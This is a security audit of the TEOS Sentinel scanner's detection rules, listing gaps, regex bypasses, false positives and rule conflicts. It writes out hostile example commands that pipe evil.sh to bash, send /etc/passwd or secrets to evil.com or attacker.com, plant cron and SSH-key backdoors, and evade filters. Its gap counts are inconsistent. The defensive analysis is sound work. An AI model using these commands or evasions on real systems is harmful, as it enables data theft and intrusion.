# TEOS Sentinel — Rule Gap Analysis

**Date:** 2026-06-12  
**Engine:** v3.0.0  
**Total Rules:** 258 (95 Core + 32 Banking + 29 Solana + 21 EVM + 8 Dependency + 23 CI/CD + 25 Token Intelligence + 25 Due Diligence)  
**Analyst:** Principal Security Engineer

---

## Executive Summary

TEOS Sentinel's 258 deterministic rules provide broad coverage across injection attacks, secret leakage, Solana program vulnerabilities, EVM contract exploits, and infrastructure escape vectors. However, a systematic audit reveals **37 distinct gaps** across all layers: 11 critical blind spots, 14 detection weaknesses, 7 false-positive risks, and 5 rule conflicts.

---

## 1. Blind Spots (11 Critical, 5 High, 4 Medium)

### 1.1 Critical Blind Spots — No Detection Exists

| # | Gap | Impact | Attack Vector |
|---|------|--------|---------------|
| BS-01 | **No Rust/Solana dependency scanning** | Malicious Anchor dependencies or crates pass undetected | `crates.io` supply-chain attack via Anchor program deps |
| BS-02 | **No EVM dependency scanning** | Malicious npm packages in Hardhat/Foundry projects | `package.json` in Foundry projects not checked for known exploits |
| BS-03 | **No non-Solana/EVM blockchain detection** | CosmWasm, Move/Aptos, Stellar, Bitcoin Script contracts pass entirely | Zero detection for non-Solana/EVM smart contracts |
| BS-04 | **No WASM module analysis** | Malicious WebAssembly binaries in bundle attacks | WASM compiled from C/C++/Rust bypasses all text-based rules |
| BS-05 | **No encrypted/encoded payload decryption** | Base64 is detected, but AES, XOR, RC4, custom encoding are invisible | `openssl enc -aes-256-cbc -d -in payload.enc` passes as benign |
| BS-06 | **No multi-line obfuscation across splits** | Command split across multiple message lines evades single-line rules | Line 1: `curl evil.sh`, Line 2: `| bash` — each line passes individually |
| BS-07 | **No steganographic content detection** | Secrets hidden in images, binaries, or whitespace pass all rules | Pixel-encoded payload in commit passes ALLOW |
| BS-08 | **No timing-based attack detection** | Delayed execution, cron-based payloads, scheduled malicious behavior | `echo "@reboot curl evil.sh | bash" >> crontab` not detected as cron is not a pattern |
| BS-09 | **No environment variable injection detection** | `$PATH`, `$LD_PRELOAD`, `$PYTHONPATH` manipulation undetected | `LD_PRELOAD=/tmp/evil.so ./app` — no rule matches |
| BS-10 | **No binary diff/backdoor detection** | Subtle binary patches in compiled artifacts | A 5-byte patch to a Solana `.so` binary changes authority check — undetectable |
| BS-11 | **No DNS tunneling detection** | Data exfiltration over DNS queries | `nslookup $(cat secret).attacker.com` — passes as benign network query |

### 1.2 High Blind Spots — Weak or Narrow Detection

| # | Gap | Current Rule | Limitation |
|---|------|-------------|------------|
| BS-12 | **No partial path traversal detection** | `../` patterns exist in `path-traversal` (analyzeCode.ts) but miss unicode, URL-encoded, double-encoded variants | `%2e%2e%2f`, `..%252f`, unicode `．．／` bypass |
| BS-13 | **No YAML/JSON serialization abuse** | `DESER.YAML_UNSAFE` matches `yaml.load` but misses `yaml.safe_load` misuse, YAML tags, JSON Schema injection | `yaml.load(input, Loader=yaml.FullLoader)` not caught |
| BS-14 | **No JWT manipulation detection** | No rules for `jwt.decode()` without verification, alg:none, weak HMAC secret | `jwt.decode(token, verify=False)` passes silently |
| BS-15 | **No AI agent prompt injection in multi-turn** | `INJECTION.PROMPT` catches single-message injection but misses chained attacks | 3 innocuous messages that together form an injection |

### 1.3 Medium Blind Spots

| # | Gap | Detail |
|---|------|--------|
| BS-16 | **No semantic grep command detection** | `grep -r "password" .` or `find . -name ".env"` are information gathering — not malicious by themselves, but part of recon chains |
| BS-17 | **No Git history poisoning detection** | `git commit --allow-empty -m "$(cat .env)"` — exfiltration via commit message |
| BS-18 | **No SSH key/MFA manipulation** | `ssh-keygen -t rsa -f /root/.ssh/authorized_keys` — backdoor installation |

---

## 2. Detection Weaknesses (14 Issues)

### 2.1 Regex Bypass Opportunities

| # | Rule | Pattern | Bypass |
|----|------|---------|--------|
| DW-01 | `SHELL.DESTRUCTIVE_CMD` | `rm\s+-rf\s+[/~]` | `rm -rf .` (current dir), `rm -rf --no-preserve-root /`, `rm -fr /`, `\rm -rf /` (backslash prefix) |
| DW-02 | `OBFUSCATION.BASE64_PIPE` | `(echo\|printf)...\|(base64\|xxd)...\|(bash\|sh\|zsh)` | `python3 -c "import base64; exec(base64.b64decode('...'))"` |
| DW-03 | `PYTHON.BASE64_EXEC` | `base64.*exec\|exec.*base64` | `__import__('base64').b64decode(...)`, `compile()+exec()`, `exec(bytes.fromhex('...').decode())` |
| DW-04 | `EXFIL.NETWORK_TOOL` | curl/wget + secrets/credentials/token/id_rsa | `curl -F "file=@/etc/passwd" http://evil.com`, `curl -d @config.json http://evil.com` |
| DW-05 | `SECRET.HIGH_ENTROPY` | 40+ char base64 strings | Base32, hex, Base85 encoded strings all bypass |
| DW-06 | `EVM-REENTRANCY` | `.call{value:` | Reentrancy via constructor, fallback function chains, cross-contract reentrancy patterns (not `.call{value:}`) |

### 2.2 Encoding & Evasion Gaps

| # | Evasion | Current Coverage |
|----|---------|-----------------|
| DW-07 | **Unicode confusables** | Zero coverage — `еxec` (Cyrillic 'е'), `ｒm -rf /` (fullwidth) bypass all text rules |
| DW-08 | **Bidirectional text (TLS/Bidi)** | Zero coverage — `rm -rf /‮⁦evil.sh⁩⁦` renders differently than parsed |
| DW-09 | **Null byte injection** | Partial — not checked in scan paths or code inputs |
| DW-10 | **Double encoding** | Zero coverage — `%25%32%65` (double URL-encoded `.`) |
| DW-11 | **Case variation** | Most patterns are case-sensitive — `RM -RF /` bypasses `rm -rf` |

### 2.3 Context-Dependent Weaknesses

| # | Context | Issue |
|----|---------|-------|
| DW-12 | **Test files** | `eval()` in test files triggers BLOCK — legitimate test patterns cause false positives |
| DW-13 | `**Documentation**` | `rm -rf /` in README examples triggers BLOCK — needs documentation context awareness |
| DW-14 | **Build scripts** | `chmod 777` in legitimate build/deploy scripts triggers WARN — legitimate use case |

---

## 3. False Positive Risks (7 Issues)

| # | Rule | False Positive Pattern | Impact |
|----|------|----------------------|--------|
| FP-01 | `SECRET.HIGH_ENTROPY` | JWT tokens, long session IDs, OAuth tokens all match — many are legitimate | Blocks valid CI/CD with unusable alerts |
| FP-02 | `SOL.ADMIN_WALLET_HARDCODED` | Legitimate hardcoded verified program IDs match | Flags known-safe Anchor programs |
| FP-03 | `AUTH.BYPASS` | `auth=false` in config files, test mocks | Development/staging configurations trigger |
| FP-04 | `DOS.INFINITE_LOOP` | `while(true)` in game loops, event listeners, valid infinite runloops | Server code, game loops, listeners |
| FP-05 | `INJECTION.PROMPT` | AI security research papers, blog posts discussing prompt injection | Academic and research content |
| FP-06 | `SECRET.ENV_FILE` | `.env.example`, `.env.template`, `.env.sample` — flagged despite exclusion regex | Legitimate documentation files |
| FP-07 | `CONFIG.CORS_STAR` | Public API endpoints that intentionally allow all origins | Valid public APIs (GET endpoints, static assets) |

---

## 4. False Negative Risks (9 Issues)

| # | Attack Pattern | Why Missed | Severity |
|----|---------------|------------|----------|
| FN-01 | **JNDI injection (Log4j-style)** | No rule for `${jndi:ldap://...}` | Critical |
| FN-02 | **Server-Side Template Injection** | No rule for `{{config}}`, `${7*7}`, `#{7*7}` in template engines | Critical |
| FN-03 | **LFI/RFI via PHP wrappers** | No rule for `php://filter`, `data://`, `expect://` | Critical |
| FN-04 | **SMTP header injection** | No rule for `\r\nCc:\r\nBcc:` in email headers | High |
| FN-05 | **HTTP parameter pollution** | No rule for duplicate `?param=value&param=evil` | Medium |
| FN-06 | **Mass assignment / prototype pollution** | `prototype-pollution` exists but misses `constructor.prototype`, `__defineSetter__`, lodash `merge` patterns | High |
| FN-07 | **NoSQL injection** | Only SQL injection patterns exist — MongoDB `$where`, `$ne`, `$gt` not covered | High |
| FN-08 | **LDAP injection** | No rule for LDAP query manipulation | Medium |
| FN-09 | **XPath injection** | No rule for XPath query injection | Medium |

---

## 5. Rule Conflicts (5 Issues)

| # | Rules | Conflict |
|----|-------|---------|
| RC-01 | `review.ts` SOL.* rules vs `solanaScanner.ts` SOL-* rules | Both scanner sets detect overlapping Solana vulnerabilities but emit different rule IDs, different severities, and from different engines. A single Solana program scanned via `/scan` vs `/solana` can produce different verdicts for the same vulnerability. |
| RC-02 | `SHELL.DESTRUCTIVE_CMD` weight=35 vs `OBFUSCATION.BASE64_PIPE` weight=35 | Both detect command obfuscation but with no hierarchical relationship. `echo 'cm0gLXJmIC8' | base64 -d | bash` triggers both, but findings are treated as co-equal rather than recognizing the hierarchy (obfuscation is a wrapper around the command). |
| RC-03 | `INJECTION.PROMPT` in review.ts vs `prompt-injection` in analyzeCode.ts | Two different engines, same detection type, potentially different verdicts for identical input. |
| RC-04 | Token scanner verdict (score-based: <30 ALLOW, 30-60 WARN, 60+ BLOCK) vs review.ts thresholds (<25 ALLOW, 25-60 WARN, 60+ BLOCK) | Different threshold boundaries for identical risk classification labels — creates inconsistency in user-facing reports. |
| RC-05 | Solana scanner `close_account` rule severity mismatch: `SOL-CLOSE-ACCOUNT-BYPASS` (high) vs `SOL.CLOSE_ACCOUNT_DEST` (critical) | Same vulnerability type, different severity depending on which engine picks it up. |

---

## 6. Rule Bypass Opportunities (8 Issues)

| # | Bypass Technique | Applicable Rules | Ease |
|----|-----------------|-----------------|------|
| RB-01 | **Base85/Base62 encoding** instead of Base64 | `OBFUSCATION.BASE64_PIPE`, `PYTHON.BASE64_EXEC` | Trivial |
| RB-02 | **Whitespace injection** — tabs, no-break spaces in commands | All shell command patterns (case sensitive) | Trivial |
| RB-03 | **Command substitution alternative** — `$(...)` vs backtick `` `...` `` vs `$((...))` | `INJECTION.TEMPLATE_CMD` only matches backtick + exec | Easy |
| RB-04 | **Variable splitting** — `a=rm; b=-rf; c=/; $a $b $c` | All shell patterns | Easy |
| RB-05 | **Alias abuse** — `alias curl='curl -o /dev/null'` then benign-looking commands | All execution patterns | Medium |
| RB-06 | **Language-specific payloads** — PowerShell, VBScript, JScript, AutoIt | Not covered by any rule | Medium |
| RB-07 | **Polyglot files** — valid PNG + valid JS in one file | All content scanners assume single-language | Hard |
| RB-08 | **Timing-based exfiltration** — `sleep $((secret_byte * 10))` | Zero coverage | Hard |

---

## 7. Recommendations

### Immediate (Critical Fixes)
1. **Unify severity thresholds** across all engines (RC-04, RC-05)
2. **Add encoding-agnostic detection** — normalize base85, hex, base62 to base64 equivalents (DW-07 through DW-11, RB-01)
3. **Cover command splitting** — detect multi-line chained commands across messages (BS-06)

### Short-Term (High Priority)
4. **Add JNDI, SSTI, LFI, NoSQL injection rules** (FN-01 through FN-08)
5. **Add Solana/EVM dependency scanning** (BS-01, BS-02)
6. **Bidirectional text detector** (DW-08)

### Medium-Term
7. **Context-aware rule engine** — test files, docs, build scripts get adjusted thresholds (DW-12 through DW-14)
8. **Heuristic suspicion scoring layer** — see UNKNOWN_THREATS.md
9. **Binary analysis hooks** — WASM, compiled Solana `.so`, raw bytecode (BS-04, BS-10)

---

*Audit timestamp: 2026-06-12T04:00:00Z*
